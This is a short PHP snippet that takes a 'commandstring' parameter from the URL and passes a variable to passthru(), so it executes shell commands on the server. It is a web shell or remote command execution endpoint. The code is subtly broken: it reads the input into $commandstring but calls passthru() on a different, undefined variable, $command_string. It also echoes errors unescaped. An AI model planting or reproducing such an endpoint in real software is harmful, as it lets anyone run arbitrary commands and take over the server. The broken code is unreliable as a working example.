<?php

    if (isset($_GET["commandstring"])){
        $commandstring = $_GET["commandstring"];
        
        try{
            passthru($command_string);
        }catch (Error $error){
            echo "<p class=mt-3><b>$error</b></p>";
        }
    }
?>